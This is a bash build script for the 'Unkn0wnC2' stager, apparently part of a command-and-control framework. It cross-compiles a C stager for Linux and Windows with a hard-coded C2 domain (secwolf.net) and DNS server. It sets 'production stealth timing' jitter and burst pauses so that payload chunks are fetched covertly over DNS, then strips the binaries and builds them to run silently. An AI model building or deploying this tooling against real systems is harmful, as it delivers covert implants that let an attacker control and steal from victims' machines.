#!/bin/bash

# Unkn0wnC2 Stager Build Script
# Builds the C stager for multiple platforms

set -e

echo "=== Unkn0wnC2 Stager Build ==="
echo ""

# Check if we're in the Stager directory
if [ ! -f "stager.c" ]; then
    echo "Error: stager.c not found"
    echo "Make sure you're running this from the Stager directory"
    exit 1
fi

# Load configuration from parent directory if available
CONFIG_FILE="../build_config.json"
DNS_SERVER="8.8.8.8"
C2_DOMAIN="secwolf.net"
# Fallback defaults - production stealth timing
JITTER_MIN_MS="60000"      # 60 seconds
JITTER_MAX_MS="120000"     # 120 seconds
CHUNKS_PER_BURST="5"       # 5 chunks per burst
BURST_PAUSE_MS="120000"    # 120 seconds between bursts
RETRY_DELAY_SECONDS="3"
MAX_RETRIES="5"

if [ -f "$CONFIG_FILE" ]; then
    echo "Loading configuration from build_config.json..."
    
    # Extract DNS server and domain using grep/sed
    if command -v jq &> /dev/null; then
        # Use jq if available
        C2_DOMAIN=$(jq -r '.client.server_domain // "secwolf.net"' "$CONFIG_FILE")
        DNS_SERVER=$(jq -r '.client.dns_server // "8.8.8.8"' "$CONFIG_FILE")
        if [ "$DNS_SERVER" = "" ] || [ "$DNS_SERVER" = "null" ]; then
            DNS_SERVER="8.8.8.8"
        fi
        
        # Extract stager jitter configuration
        JITTER_MIN_MS=$(jq -r '.stager.jitter_min_ms // 100' "$CONFIG_FILE")
        JITTER_MAX_MS=$(jq -r '.stager.jitter_max_ms // 500' "$CONFIG_FILE")
        CHUNKS_PER_BURST=$(jq -r '.stager.chunks_per_burst // 10' "$CONFIG_FILE")
        BURST_PAUSE_MS=$(jq -r '.stager.burst_pause_ms // 2000' "$CONFIG_FILE")
        RETRY_DELAY_SECONDS=$(jq -r '.stager.retry_delay_seconds // 3' "$CONFIG_FILE")
        MAX_RETRIES=$(jq -r '.stager.max_retries // 5' "$CONFIG_FILE")
        
        # Validate extracted values
        if [ -z "$CHUNKS_PER_BURST" ] || [ "$CHUNKS_PER_BURST" = "null" ]; then
            echo "Warning: Could not extract chunks_per_burst, using default: 10"
            CHUNKS_PER_BURST=10
        fi
    else
        # Fallback to grep/sed
        C2_DOMAIN=$(grep -oP '"server_domain"\s*:\s*"\K[^"]+' "$CONFIG_FILE" 2>/dev/null || echo "secwolf.net")
        DNS_SERVER=$(grep -oP '"dns_server"\s*:\s*"\K[^"]+' "$CONFIG_FILE" 2>/dev/null || echo "8.8.8.8")
        if [ "$DNS_SERVER" = "" ]; then
            DNS_SERVER="8.8.8.8"
        fi
        
        # Extract stager jitter configuration (basic grep)
        JITTER_MIN_MS=$(grep -oP '"jitter_min_ms"\s*:\s*\K[0-9]+' "$CONFIG_FILE" 2>/dev/null || echo "100")
        JITTER_MAX_MS=$(grep -oP '"jitter_max_ms"\s*:\s*\K[0-9]+' "$CONFIG_FILE" 2>/dev/null || echo "500")
        CHUNKS_PER_BURST=$(grep -oP '"chunks_per_burst"\s*:\s*\K[0-9]+' "$CONFIG_FILE" 2>/dev/null || echo "10")
        BURST_PAUSE_MS=$(grep -oP '"burst_pause_ms"\s*:\s*\K[0-9]+' "$CONFIG_FILE" 2>/dev/null || echo "2000")
        RETRY_DELAY_SECONDS=$(grep -oP '"retry_delay_seconds"\s*:\s*\K[0-9]+' "$CONFIG_FILE" 2>/dev/null || echo "3")
        MAX_RETRIES=$(grep -oP '"max_retries"\s*:\s*\K[0-9]+' "$CONFIG_FILE" 2>/dev/null || echo "5")
    fi
    
    # Calculate approximate download time (assuming 100 chunks as example)
    EXAMPLE_CHUNKS=100
    JITTER_AVG_MS=$(( (JITTER_MIN_MS + JITTER_MAX_MS) / 2 ))
    NUM_BURSTS=$(( (EXAMPLE_CHUNKS + CHUNKS_PER_BURST - 1) / CHUNKS_PER_BURST ))
    
    # Time = (chunks * 1s per chunk) + (bursts * (jitter + burst_pause))
    TRANSFER_TIME_S=$EXAMPLE_CHUNKS  # ~1 second per chunk for DNS round-trip
    PAUSE_TIME_S=$(( (NUM_BURSTS * (JITTER_AVG_MS + BURST_PAUSE_MS)) / 1000 ))
    TOTAL_TIME_S=$(( TRANSFER_TIME_S + PAUSE_TIME_S ))
    
    # Format time
    if [ $TOTAL_TIME_S -lt 60 ]; then
        FORMATTED_TIME="${TOTAL_TIME_S}s"
    elif [ $TOTAL_TIME_S -lt 3600 ]; then
        MINS=$(( TOTAL_TIME_S / 60 ))
        SECS=$(( TOTAL_TIME_S % 60 ))
        FORMATTED_TIME="${MINS}m ${SECS}s"
    else
        HOURS=$(( TOTAL_TIME_S / 3600 ))
        MINS=$(( (TOTAL_TIME_S % 3600) / 60 ))
        FORMATTED_TIME="${HOURS}h ${MINS}m"
    fi
    
    echo "  DNS Server: $DNS_SERVER"
    echo "  C2 Domain:  $C2_DOMAIN"
    echo ""
    echo "  STAGER TIMING CONFIGURATION:"
    echo "  ├─ Jitter:      ${JITTER_MIN_MS}-${JITTER_MAX_MS}ms ($(( JITTER_MIN_MS / 1000 ))s - $(( JITTER_MAX_MS / 1000 ))s)"
    echo "  ├─ Burst Size:  $CHUNKS_PER_BURST chunks before pause"
    echo "  ├─ Burst Pause: ${BURST_PAUSE_MS}ms ($(( BURST_PAUSE_MS / 1000 ))s)"
    echo "  ├─ Retries:     $MAX_RETRIES attempts (${RETRY_DELAY_SECONDS}s delay)"
    echo "  └─ Est. Time:   ~${FORMATTED_TIME} for ${EXAMPLE_CHUNKS} chunks"
    echo ""
    echo "  COMPILER FLAGS:"
    echo "  ├─ -DMIN_CHUNK_DELAY_MS=$JITTER_MIN_MS"
    echo "  ├─ -DMAX_CHUNK_DELAY_MS=$JITTER_MAX_MS"
    echo "  ├─ -DCHUNKS_PER_BURST=$CHUNKS_PER_BURST"
    echo "  └─ -DBURST_PAUSE_MS=$BURST_PAUSE_MS"
    echo ""
fi

echo ""

# Check for required tools
echo "Checking build tools..."

if ! command -v gcc &> /dev/null; then
    echo "Error: gcc not found"
    exit 1
fi
echo "✓ gcc found"

# Check for cross-compilers
HAS_MINGW_64=0

if command -v x86_64-w64-mingw32-gcc &> /dev/null; then
    HAS_MINGW_64=1
    echo "✓ x86_64-w64-mingw32-gcc found (Windows x64)"
fi

echo ""

# Parse build mode
DEBUG_MODE=0
if [ "$1" = "--debug" ] || [ "$1" = "-d" ]; then
    DEBUG_MODE=1
    echo "Building in DEBUG mode (verbose output enabled)"
else
    echo "Building in PRODUCTION mode (silent operation)"
fi

# Create build output directory
BUILD_DIR="../build/stager"
mkdir -p "$BUILD_DIR"

echo "Building stagers..."
echo ""

# Build Linux x64
echo "→ Building Linux x64 stager..."

# Capture output and filter warnings, but keep errors
BUILD_OUTPUT=$(gcc -Wall -Wno-stringop-truncation -O2 -m64 \
    -DDEBUG_MODE=$DEBUG_MODE \
    -DDNS_SERVER=\"$DNS_SERVER\" \
    -DC2_DOMAIN=\"$C2_DOMAIN\" \
    -DMIN_CHUNK_DELAY_MS=$JITTER_MIN_MS \
    -DMAX_CHUNK_DELAY_MS=$JITTER_MAX_MS \
    -DCHUNKS_PER_BURST=$CHUNKS_PER_BURST \
    -DBURST_PAUSE_MS=$BURST_PAUSE_MS \
    -DRETRY_DELAY_SECONDS=$RETRY_DELAY_SECONDS \
    -DMAX_RETRIES=$MAX_RETRIES \
    stager.c -o "$BUILD_DIR/stager-linux-x64" -lz 2>&1)
BUILD_STATUS=$?

# Only show errors, not warnings
echo "$BUILD_OUTPUT" | grep -i "error:" || true

if [ $BUILD_STATUS -eq 0 ]; then
    strip -s "$BUILD_DIR/stager-linux-x64" 2>/dev/null || true
    echo "  ✓ $BUILD_DIR/stager-linux-x64"
else
    echo "  ✗ Failed to build Linux x64 stager"
    echo "$BUILD_OUTPUT" | grep -v "warning:"
    exit 1
fi

echo ""

# Build Windows x64
if [ $HAS_MINGW_64 -eq 1 ]; then
    echo "→ Building Windows x64 stager..."
    
    BUILD_OUTPUT=$(x86_64-w64-mingw32-gcc -Wall -Wno-unknown-pragmas -O2 -s \
        -DDEBUG_MODE=$DEBUG_MODE \
        -DDNS_SERVER=\"$DNS_SERVER\" \
        -DC2_DOMAIN=\"$C2_DOMAIN\" \
        -DMIN_CHUNK_DELAY_MS=$JITTER_MIN_MS \
        -DMAX_CHUNK_DELAY_MS=$JITTER_MAX_MS \
        -DCHUNKS_PER_BURST=$CHUNKS_PER_BURST \
        -DBURST_PAUSE_MS=$BURST_PAUSE_MS \
        -DRETRY_DELAY_SECONDS=$RETRY_DELAY_SECONDS \
        -DMAX_RETRIES=$MAX_RETRIES \
        stager.c -o "$BUILD_DIR/stager-windows-x64.exe" -lws2_32 -static 2>&1)
    BUILD_STATUS=$?
    
    # Only show errors, not warnings
    echo "$BUILD_OUTPUT" | grep -i "error:" || true
    
    if [ $BUILD_STATUS -eq 0 ]; then
        strip "$BUILD_DIR/stager-windows-x64.exe" 2>/dev/null || true
        echo "  ✓ $BUILD_DIR/stager-windows-x64.exe"
    else
        echo "  ✗ Failed to build Windows x64 stager"
        echo "$BUILD_OUTPUT" | grep -v "warning:"
    fi
else
    echo "  ⊘ Skipping Windows x64 (mingw-w64 not available)"
fi

echo ""
echo "=== Stager Build Complete ==="
